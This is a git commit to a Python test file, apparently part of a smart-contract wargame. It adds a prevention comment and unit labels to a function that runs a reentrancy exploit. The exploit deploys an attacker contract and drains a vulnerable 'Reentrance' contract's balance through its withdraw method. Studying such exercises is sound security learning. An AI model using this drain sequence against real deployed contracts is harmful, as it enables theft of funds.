dd60451490924ac23e831507d93a18c9c6cc8a87
honzaprevratil <honzikprevratil@gmail.com>
2024-03-19 11:16:37 +0100

    📝 Adds notes to comments

--- tests/lv10_reentrancy_test.py
+++ tests/lv10_reentrancy_test.py
@@ -13,9 +13,10 @@ def test_lv10():
 def exploit_lv10(contract: Reentrance):
     # Attack vector: Reentrancy on withdraw method
     #   because withdraw uses 'call' that does not revert on failure, no termination condition is needed for the attack
-    print(f"Balance before attack: {contract.balance / 10**18}")
+    # Attack prevention: Checks-Effects-Interactions pattern
+    print(f"Balance before attack: {contract.balance / 10**18} Eth")
     attacker = ReentrancyAttack.deploy(contract.address)
     attacker.donate(value=1 * 10**18)
     attacker.trigger(1 * 10**18)
     attacker.withdrawAll()
-    print(f"Balance after attack:  {contract.balance / 10**18}")
+    print(f"Balance after attack:  {contract.balance / 10**18} Eth")
